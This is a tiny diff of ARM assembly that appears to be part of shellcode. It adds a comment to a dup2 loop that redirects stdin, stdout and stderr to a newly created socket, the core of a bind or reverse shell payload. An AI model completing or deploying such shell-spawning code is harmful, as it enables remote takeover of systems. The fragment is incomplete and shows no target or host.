@@ -36,7 +36,7 @@ _start:
 	mov r7,#63 /* dup2 */
 	mov r1,#2
 Lb:
-	mov r0,r6
+	mov r0,r6 /* dup stdin,stdout, and stderr to the newly created socket */
 	svc 1
 	sub r1,#1
 	bpl Lb
